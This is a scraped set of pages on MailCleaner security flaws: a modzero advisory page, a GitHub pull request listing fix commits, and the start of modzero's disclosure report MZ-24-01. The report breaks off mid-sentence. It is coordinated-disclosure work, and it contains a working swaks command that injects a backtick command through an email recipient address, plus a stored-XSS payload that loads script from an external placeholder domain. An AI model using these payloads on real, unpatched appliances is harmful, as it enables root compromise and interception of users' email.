=== Content from modzero.com_d2137403_20250111_063717.html ===

[![](/img/logo.svg)](https://modzero.com/en/)

* Services
  [Services](/en/services/)
  + [Application Pentesting](/en/services/#application-pentesting)
  + [Cloud Pentesting](/en/services/#cloud-pentesting)
  + [Red Teaming](/en/services/#red-teaming)
  + [Hardware/Software Review](/en/services/#hardware-review)
  + [Design & Concept Advisory](/en/services/#design-concept-advisory)
* Company
  [Company](/en/company/)
  + [About](/en/company/#about)
  + [Jobs](/en/company/#jobs)
* News
  [News](/en/news/)
  + [Blog](/en/blog/)
  + [Advisories](/en/advisories/)

[DE](/de/)
[Contact Us](https://modzero.com/en/contact/)

[⟵ Advisories](https://modzero.com/en/advisories/)
# [MZ-24-01] MailCleaner

ID: MZ-24-01

Release: April 29, 2024

Credits: Michael Imfeld & Pascal Zenker

The full disclosure report can be found [here](/static/MZ-24-01_modzero_MailCleaner.pdf). Further details are published in our [blog post](https://modzero.com/en/blog/beyond-the-at-symbol/).

## Other News

* [PLAYGROUND
  ### Exploiting SSTI in a Modern Spring Boot Application (3.3.4)

  January 8, 2025

  Learn how to exploit Server-Side Template Injection (SSTI) in a Spring Boot application using the Thymeleaf templating engine. Special focus will be set on bypassing defenses in newer versions.](https://modzero.com/en/blog/spring_boot_ssti/)

* [PLAYGROUND
  ### Tutorial: How we learned to love the doc(umentation)

  October 14, 2024

  Just read documentation to get RCE?! Our colleague Theresa designed a tutorial guiding you through an OpenVPN exploit scenario â for you to try at home!](https://modzero.com/en/blog/how-we-learned-to-love-the-doc/)

[All news ⟶](https://modzero.com/en/news/)

### [Services](/en/services/)

* [Application Pentesting](/en/services/#application-pentesting)
* [Cloud Pentesting](/en/services/#cloud-pentesting)
* [Red Teaming](/en/services/#red-teaming)
* [Hardware/Software Review](/en/services/#hardware-review)
* [Design & Concept Advisory](/en/services/#design-concept-advisory)

### [Company](/en/company/)

* [About](/en/company/#about)
* [Jobs](/en/company/#jobs)

### [News](/en/news/)

* [Blog](/en/blog/)
* [Advisories](/en/advisories/)

### [Contact](https://modzero.com/en/contact/)

* [Contact Us](https://modzero.com/en/contact/)

* ![](/img/favicon.svg)
* © 2011 – 2025
* [Legal & Privacy Policy](https://modzero.com/en/legal/)

[DE](/de/)



=== Content from github.com_4311f49a_20250111_063712.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMailCleaner%2FMailCleaner%2Fpull%2F601)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMailCleaner%2FMailCleaner%2Fpull%2F601)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=MailCleaner%2FMailCleaner)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MailCleaner](/MailCleaner)
/
**[MailCleaner](/MailCleaner/MailCleaner)**
Public

* [Notifications](/login?return_to=%2FMailCleaner%2FMailCleaner) You must be signed in to change notification settings
* [Fork
  35](/login?return_to=%2FMailCleaner%2FMailCleaner)
* [Star
   92](/login?return_to=%2FMailCleaner%2FMailCleaner)

* [Code](/MailCleaner/MailCleaner)
* [Issues
  9](/MailCleaner/MailCleaner/issues)
* [Pull requests
  1](/MailCleaner/MailCleaner/pulls)
* [Actions](/MailCleaner/MailCleaner/actions)
* [Projects
  0](/MailCleaner/MailCleaner/projects)
* [Wiki](/MailCleaner/MailCleaner/wiki)
* [Security](/MailCleaner/MailCleaner/security)
* [Insights](/MailCleaner/MailCleaner/pulse)

Additional navigation options

* [Code](/MailCleaner/MailCleaner)
* [Issues](/MailCleaner/MailCleaner/issues)
* [Pull requests](/MailCleaner/MailCleaner/pulls)
* [Actions](/MailCleaner/MailCleaner/actions)
* [Projects](/MailCleaner/MailCleaner/projects)
* [Wiki](/MailCleaner/MailCleaner/wiki)
* [Security](/MailCleaner/MailCleaner/security)
* [Insights](/MailCleaner/MailCleaner/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FMailCleaner%2FMailCleaner%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FMailCleaner%2FMailCleaner%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Bug fixes #601

 Merged

[JohnMertz](/JohnMertz)
merged 22 commits into
[MailCleaner:master](/MailCleaner/MailCleaner/tree/master "MailCleaner/MailCleaner:master")
from
[JohnMertz:bug-fixes](/JohnMertz/MailCleaner/tree/bug-fixes "JohnMertz/MailCleaner:bug-fixes")

Apr 23, 2024

 Merged

# [Bug fixes](#top) #601

[JohnMertz](/JohnMertz)
merged 22 commits into
[MailCleaner:master](/MailCleaner/MailCleaner/tree/master "MailCleaner/MailCleaner:master")
from
[JohnMertz:bug-fixes](/JohnMertz/MailCleaner/tree/bug-fixes "JohnMertz/MailCleaner:bug-fixes")

Apr 23, 2024

[Conversation
0](/MailCleaner/MailCleaner/pull/601)
[Commits
22](/MailCleaner/MailCleaner/pull/601/commits)
[Checks
0](/MailCleaner/MailCleaner/pull/601/checks)
[Files changed](/MailCleaner/MailCleaner/pull/601/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=60&v=4)](/JohnMertz)

Copy link

Contributor

### @JohnMertz **[JohnMertz](/JohnMertz)** commented [Apr 23, 2024](#issue-2258958482)

 *No description provided.*

Sorry, something went wrong.

All reactions

 [JohnMertz](/JohnMertz)
added 22 commits
[April 4, 2024 14:51](#commits-pushed-b43bef6)

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Reject addresses with characters intended for command execution](/MailCleaner/MailCleaner/pull/601/commits/b43bef6187fd07500c9298b9455ef4f52a06f91f "Reject addresses with characters intended for command execution")`

`[b43bef6](/MailCleaner/MailCleaner/pull/601/commits/b43bef6187fd07500c9298b9455ef4f52a06f91f)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Extend previous to remote addresses, add reject messages](/MailCleaner/MailCleaner/pull/601/commits/b8de01e76dc951ef9c41ef6459d4fba8425ef3d7 "Extend previous to remote addresses, add reject messages")`

`[b8de01e](/MailCleaner/MailCleaner/pull/601/commits/b8de01e76dc951ef9c41ef6459d4fba8425ef3d7)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Escape special characters in quarantine paths](/MailCleaner/MailCleaner/pull/601/commits/7488cf98623cd4d4a1f8370c832c99d70bc9d16d "Escape special characters in quarantine paths")`

`[7488cf9](/MailCleaner/MailCleaner/pull/601/commits/7488cf98623cd4d4a1f8370c832c99d70bc9d16d)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Disarm HTML tags in message info for incident summary](/MailCleaner/MailCleaner/pull/601/commits/2cd74c8c2855ecb5cef30feac3d7f1fe94df8628 "Disarm HTML tags in message info for incident summary")`

`[2cd74c8](/MailCleaner/MailCleaner/pull/601/commits/2cd74c8c2855ecb5cef30feac3d7f1fe94df8628)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Enforce more strict log paths](/MailCleaner/MailCleaner/pull/601/commits/691222b98e549278e9ac7533d01f04d005c02565 "Enforce more strict log paths")`

`[691222b](/MailCleaner/MailCleaner/pull/601/commits/691222b98e549278e9ac7533d01f04d005c02565)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Only allow valid report types](/MailCleaner/MailCleaner/pull/601/commits/ad3f780010dc3ecdee281572adfd1701d776b263 "Only allow valid report types")`

`[ad3f780](/MailCleaner/MailCleaner/pull/601/commits/ad3f780010dc3ecdee281572adfd1701d776b263)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Disarm HTML tags in quarantined headers](/MailCleaner/MailCleaner/pull/601/commits/2668df1d6a55601f5710f6859bdb58b6d8ae62c6 "Disarm HTML tags in quarantined headers

Also a small typo found.")`
 …

`[2668df1](/MailCleaner/MailCleaner/pull/601/commits/2668df1d6a55601f5710f6859bdb58b6d8ae62c6)`

```
Also a small typo found.
```

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Disarm HTML tags in tracing headers](/MailCleaner/MailCleaner/pull/601/commits/ae424ca4355588177ef5d7dada0b698baf7bbd24 "Disarm HTML tags in tracing headers")`

`[ae424ca](/MailCleaner/MailCleaner/pull/601/commits/ae424ca4355588177ef5d7dada0b698baf7bbd24)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Exit before url is set, fix view for valid path](/MailCleaner/MailCleaner/pull/601/commits/22aaae044fc5bb9d1a3f672ad54df65157a40593 "Exit before url is set, fix view for valid path")`

`[22aaae0](/MailCleaner/MailCleaner/pull/601/commits/22aaae044fc5bb9d1a3f672ad54df65157a40593)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Escape search parameters](/MailCleaner/MailCleaner/pull/601/commits/0376bff86430a9803ee3f75b991cc48c43804519 "Escape search parameters")`

`[0376bff](/MailCleaner/MailCleaner/pull/601/commits/0376bff86430a9803ee3f75b991cc48c43804519)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Disarm HTML](/MailCleaner/MailCleaner/pull/601/commits/64ee7eab94577a58fb180675cb7471e1672a6094 "Disarm HTML")`

`[64ee7ea](/MailCleaner/MailCleaner/pull/601/commits/64ee7eab94577a58fb180675cb7471e1672a6094)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Overwrite anything not matching an expected command](/MailCleaner/MailCleaner/pull/601/commits/91dc98f95371438acc803ec3533b2da5b8cd90ec "Overwrite anything not matching an expected command")`

`[91dc98f](/MailCleaner/MailCleaner/pull/601/commits/91dc98f95371438acc803ec3533b2da5b8cd90ec)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[CleClean/Reject inputs a](/MailCleaner/MailCleaner/pull/601/commits/1f5300cbab7e11c3106968bd01d62c9602cee53c "CleClean/Reject inputs a")`

`[1f5300c](/MailCleaner/MailCleaner/pull/601/commits/1f5300cbab7e11c3106968bd01d62c9602cee53c)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Reject/clean invalid inputs](/MailCleaner/MailCleaner/pull/601/commits/28411d4d53529f2e9aa922c448ac55fbf617eb33 "Reject/clean invalid inputs")`

`[28411d4](/MailCleaner/MailCleaner/pull/601/commits/28411d4d53529f2e9aa922c448ac55fbf617eb33)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Clean inputs](/MailCleaner/MailCleaner/pull/601/commits/0c51c471a6ba6bfd0ca08bd2ca3a3a85516a90da "Clean inputs")`

`[0c51c47](/MailCleaner/MailCleaner/pull/601/commits/0c51c471a6ba6bfd0ca08bd2ca3a3a85516a90da)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Revert early exit](/MailCleaner/MailCleaner/pull/601/commits/0e9e269eae5efd5a7d27f1702997c4e7b4a2b15f "Revert early exit

Null service is used to get ALL services.")`
 …

`[0e9e269](/MailCleaner/MailCleaner/pull/601/commits/0e9e269eae5efd5a7d27f1702997c4e7b4a2b15f)`

```
Null service is used to get ALL services.
```

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Split system args and call IPC::Run where possible](/MailCleaner/MailCleaner/pull/601/commits/a267e207b1e10de3e7ecb92bd094ae0111bc0732 "Split `system` args and call IPC::Run where possible")`

`[a267e20](/MailCleaner/MailCleaner/pull/601/commits/a267e207b1e10de3e7ecb92bd094ae0111bc0732)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Better sanitization with htmlspecialchars instead of preg_replace](/MailCleaner/MailCleaner/pull/601/commits/e410e04dac16f747b3742d435f2c13bd41d8db09 "Better sanitization with htmlspecialchars instead of preg_replace")`

`[e410e04](/MailCleaner/MailCleaner/pull/601/commits/e410e04dac16f747b3742d435f2c13bd41d8db09)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Properly anchor regex](/MailCleaner/MailCleaner/pull/601/commits/8481770692da85f8ca88899da2664f9871c614f8 "Properly anchor regex")`

`[8481770](/MailCleaner/MailCleaner/pull/601/commits/8481770692da85f8ca88899da2664f9871c614f8)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Typo. Missing .](/MailCleaner/MailCleaner/pull/601/commits/a5475c8c6f26df00e4755b6ff9e97b4acced9960 "Typo. Missing `.`")`

`[a5475c8](/MailCleaner/MailCleaner/pull/601/commits/a5475c8c6f26df00e4755b6ff9e97b4acced9960)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Erroneus path prefix](/MailCleaner/MailCleaner/pull/601/commits/7d7229e8742eecc42f8e91b8d6086da9b581b1d0 "Erroneus path prefix")`

`[7d7229e](/MailCleaner/MailCleaner/pull/601/commits/7d7229e8742eecc42f8e91b8d6086da9b581b1d0)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&v=4)](/JohnMertz)

`[Syntax error](/MailCleaner/MailCleaner/pull/601/commits/ba6796b78cef292840ba85b08b59976ad06ced4c "Syntax error")`

`[ba6796b](/MailCleaner/MailCleaner/pull/601/commits/ba6796b78cef292840ba85b08b59976ad06ced4c)`

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&u=aa36f7f7019d15d1a188c9a64ce031acf01e1cde&v=4)](/JohnMertz)
[JohnMertz](/JohnMertz)
merged commit [`72b56ec`](/MailCleaner/MailCleaner/commit/72b56ecfc9b23fd3b714220812381f656cfb67ce)
into
MailCleaner:master

[Apr 23, 2024](https://github.com/MailCleaner/MailCleaner/pull/601#event-12576229096)

 [![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=40&u=aa36f7f7019d15d1a188c9a64ce031acf01e1cde&v=4)](/JohnMertz)
[JohnMertz](/JohnMertz)
deleted the
bug-fixes

branch
[August 22, 2024 21:37](#event-13984750947)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FMailCleaner%2FMailCleaner%2Fpull%2F601)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

1 participant

[![@JohnMertz](https://avatars.githubusercontent.com/u/6070612?s=52&v=4)](/JohnMertz)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from modzero.com_8474aecd_20250111_063719.html ===
MailCleaner

S E C U R I T Y   D I S C L OS U R E   R E P O R T

ID: MZ-24-01

Version: 1.0

Date: 2024-04-29

Classification: Public

MailCleaner (MZ-24-01 / 1.0)

1

Versioning

Version  Date

Author

Comment

1.0

2024-04-29  modzero

Public release

Credits

The work contained in this  report  was conducted by the modzero team consisting of
(alphabetical order):

▪  Michael Imfeld
▪  Pascal Zenker

Disclosure Timeline

Date

Comment

2024-03-25

modzero makes several attempts to contact MailCleaner and
Alinto AG but without response.

2024-04-02

modzero creates an issue on the public GitHub repository asking
for contact information. The Alinto CTO responds with their email
address.

2024-04-04

modzero sends the disclosure report draft to the email address
provided by Alinto’s CTO in the GitHub issue.

2024-04-05

Alinto CTO confirms the receival of the report, thanks modzero
and informs that they will start with the assessment of the
vulnerabilities immediately.

2024-04-23

Alinto CTO informs modzero that the vulnerabilities have been
fixed and published to GitHub.

2024-04-29

modzero publishes this report.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

2

CVEs

The following CVEs have been assigned by MITRE:

Vulnerability

Unauthenticated OS Command Injection via Email

CVSS Rating

■ 9.8 Critical CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CVE-ID

CVE-2024-3191

Vulnerability

Unauthenticated Stored XSS in Admin Interface via Email

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:H

CVE-ID

CVE-2024-3192

Vulnerability

CSRF-based OS Command Injection on Multiple Endpoints

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CVE-ID

CVE-2024-3193

Vulnerability

Reflected XSS on Multiple Endpoints

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:H

CVE-ID

CVE-2024-3194

Vulnerability

Authenticated Path Traversal on Multiple Endpoints

CVSS Rating

■ 4.7 Medium CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CVE-ID

CVE-2024-3195

Vulnerability

Unauthenticated OS Command Injection on Local SOAP
Endpoints

CVSS Rating

■ 6.7 Medium CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

CVE-ID

CVE-2024-3196

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

3

Contents
1 Summary ............................................................................. 4

2 Findings – Mail Service ......................................................... 5

2.1 Unauthenticated OS Command Injection via Email ...................................... 5

2.2 Unauthenticated Stored XSS in Admin Interface via Email ......................... 9

3 Findings – Web Service ........................................................ 12

3.1 CSRF-based OS Command Injection on Multiple Endpoints ..................... 12

3.2 Reflected XSS on Multiple Endpoints ......................................................... 17

3.3 Authenticated Path Traversal on Multiple Endpoints ................................ 20

4 Findings – SOAP Service ...................................................... 23

4.1 Unauthenticated OS Command Injection on Local SOAP Endpoints ......... 23

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

4

1 Summary

MailCleaner  is  an  email  filtering  appliance  which  is  designed  to  counteract  spam,
viruses, and other malicious content. It offers both commercial and community editions
to accommodate different requirements.

modzero  identified  critical  vulnerabilities  that  can  allow  unauthenticated  remote
attackers to take over the appliance, to fully compromise its confidentiality and integrity
and therefore any email message traveling through it. Attackers can execute arbitrary
OS commands on the appliance server through three routes:

▪  Sending a specifically crafted email to the appliance
▪  A logged-in administrator visits an attacker-controlled website
▪  Sending a logged-in administrator a specifically prepared link to their

MailCleaner admin interface

Aside  from  that,  several  vulnerabilities  were  identified,  which  allow  authenticated
attackers with administrative privileges to execute OS commands on the system or  to
read  and  write  files  on  it.  Lastly,  multiple  locally  provided  SOAP  endpoints  are
susceptible to OS command injections as well. In a cluster setup these endpoints are
exposed  to  all  cluster  members1  and  the  internal  network.  This  effectively  allows
attackers to compromise every cluster member by gaining control of a single instance
or to elevate their privileges on a compromised machine.

Products that are known to be affected:

▪  2023.03.142 and earlier

1
https://web.archive.org/web/20240320140606/https://www.mailcleaner.net/downloads/Ma
ilCleaner-installation.pdf
2
https://web.archive.org/web/20231003194311/https://www.mailcleaner.net/informations
/release/

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

5

2 Findings – Mail Service

This  chapter  describes  all  identified  findings  within  the  mail  service,  that  can  be
exploited when the mail ports are exposed to the internet.

2.1 Unauthenticated OS Command Injection via Email

Class

CWE-78: Improper Neutralization of Special Elements used in an
OS Command

CVSS Rating

■ 9.8 Critical CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Component

Mail Filter

CVE-ID

CVE-2024-3191

Summary

An OS command injection vulnerability in one of the cleanup cronjobs of MailCleaner
appliance  enables  remote  attackers  to  execute  arbitrary  commands  as  root  user  by
sending  a  specially  crafted  email  to  MailCleaner.  This  allows  attackers  to  fully
compromise the appliance and intercept any emails handled by the system.

Requirements

This vulnerability can be exploited if any of the following requirements is met:

▪  The mail server which receives the forwarded emails from MailCleaner has sub-

addressing enabled and the attacker knows a valid email address

▪  The mail server which receives the forwarded emails from MailCleaner has no

address verification or accepts wildcards in the local part of the address

▪  The mail server which receives the forwarded emails from MailCleaner cannot

be reached within the defined timeout

Details

MailCleaner  appliance  classifies  incoming  email  messages  according  to  various  rule
sets  and  applies  filtering  mechanisms.  If  messages  are  identified  as  spam,  they  are
moved  into  a  spam  folder  on  the  MailCleaner  system.  The  clean_spam_quarantine.pl
cronjob  which  is  responsible  to  clear  said  spam  folder  regularly  is  susceptible  to  OS
command injections which are abusable via a malicious email recipient address.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

6

As  MailCleaner  performs  a  recipient  verification  on  the  destination  mail  server  an
attacker must provide a valid recipient address. If the destination mail server is either
offline, has address verification disabled or accepts arbitrary local parts of an address
(catch-all  addresses)  the  payload  can  be  used  directly  as  local  part  of  the  address
(payload@domain.com).

If  the  mentioned  conditions  are  not  met  an  attacker  must  first  obtain  a  valid  email
address  such  as  firstname.lastname@domain.com.  The  attacker’s  payload  is  then
appended  to  the  valid  email  address  utilizing  sub-addressing  with  the  plus  character
(firstname.lastname+payload@domain.com). The concept of sub-addressing is widely
used and accepted by many mail servers3, e.g. Google Mail or Microsoft Exchange.

To ensure that the attacker’s email message will be classified as spam by MailCleaner
and therefore be moved to the spam quarantine, a test string called “Generic Test for
Unsolicited Bulk Email” can be used as email body.4

The  finalized attack  is  carried  out as  depicted  in  Listing  1.  Since  the  message  will  be
moved to quarantine and no delivery attempt to the target mail server will be made it
does not have to originate from a legitimate mail server.

1

2

3

swaks --to 'test+`id`@mod0.local' \

--from test@mod0.eu --server mailcleaner.local \

--body 'XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X'

Listing 1 - OS command injection payload in email recipient address sent to MailCleaner.

By inspecting the filesystem on MailCleaner it can be confirmed that the malicious email
was moved to the quarantine folder. (see Figure 1)

Figure 1 - Inspecting the quarantine folder on MailCleaner after sending malicious email.

3
http://web.archive.org/web/20240126064532/https://datatracker.ietf.org/doc/html/rfc
5233
4 https://web.archive.org/web/20240322092558/https://spamassassin.apache.org/gtube/

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

7

The  vulnerability  causing  the  command  to  be  executed  stems  from  the  script
clean_spam_quarantine.pl.  As  observed  in  Figure  2  the  script  walks  through  the

quarantine directory and its subfolders. The variable $domain_entry is populated with
the subdirectory name which is the recipient’s email address.

Figure 2 - Cronjob script clean_spam_quarantine.pl walking through quarantine directory.

At  the  end  of  the  second  level  loop  the  $domain_entry  is  inserted  without  any

sanitization into a system() call intended to remove the directory (see Figure 3).
This  call  is  made  every  time  the script  runs  thus  triggering  the  attacker’s  payload  on
every run.

Figure 3 - OS command injection point in clean_spam_quarantine.pl.

There is another OS command injection which is triggered once the retention time of

quarantined email is exceeded. In this case the $user_entry variable is inserted into a
similar construct. (see Figure 4) At this point said variable represents the full path to an
email entry in the quarantine thus containing the attacker’s payload.

Figure 4 - Second OS command injection point in clean_spam_quarantine.pl.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

8

In MailCleaner’s default configuration the vulnerable cronjob is executed every day at
midnight. Once the job is triggered the attacker’s payload is executed. Attackers  that
exploit this vulnerability can execute arbitrary commands as root user and can therefore
fully compromise the appliance.

Note

The exploit showcased in this report serves only as proof of concept. The vendor was
provided with a weaponized payload where attackers can establish a reverse shell to a
vulnerable instance and fully compromise the system. This exploit will be released to the
public at a later point in time to give users enough time to patch their systems.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

9

2.2 Unauthenticated Stored XSS in Admin Interface via

Email

Class

CWE-79:  Improper  Neutralization  of  Input  During  Web  Page
Generation

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:H

Component

Admin Interface

Affected
Endpoints

▪
▪

/admin/managespamquarantine
/admin/managetracing

CVE-ID

CVE-2024-3192

Summary

An  identified  stored  Cross-Site-Scripting  vulnerability  allows  an  unauthenticated
attacker  to  inject  malicious  JavaScript  into  the  administrator  dashboard  with  a
specifically crafted email. The vulnerability can be used for session hijacking, data theft,
or unauthorized actions on behalf of an administrative user. In combination with other
findings from this report, the vulnerability can be chained to an OS command injection.

Requirements

The attacker knows a valid email address.

Details

MailCleaner provides dashboards for admin users to trace delivered emails and inspect
quarantined  or  spam-marked  emails.  For  each  mail  separate  entries  within  specific
tables are created. Each table entry displays the recipient, sender, and the subject of
the email (refer to Figure 5).

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

10

Figure 5 – The MailCleaner administrator dashboard.

The  dashboard  renders  the  senders  and  the  recipients  email  address  without
sanitization. An attacker can abuse this circumstance to inject arbitrary content into the
site including  JavaScript code by supplying malicious  email addresses. The length of
the injected content is limited as the web application will truncate the email addresses
starting from a certain length. This is not a restriction though, as it is possible to load
arbitrary JavaScript from an external domain as showcased in the payload in Listing 2.
like  e.g.,
The  attacker-controlled  domain

then  delivers  a  classic  payload

alert('modzero').

1

<script/src=//SHORT_DOMAIN>

Listing 2 - XSS payload to load an external JavaScript file from another domain.

As MailCleaner performs a recipient address verification, it is most proficient to deliver
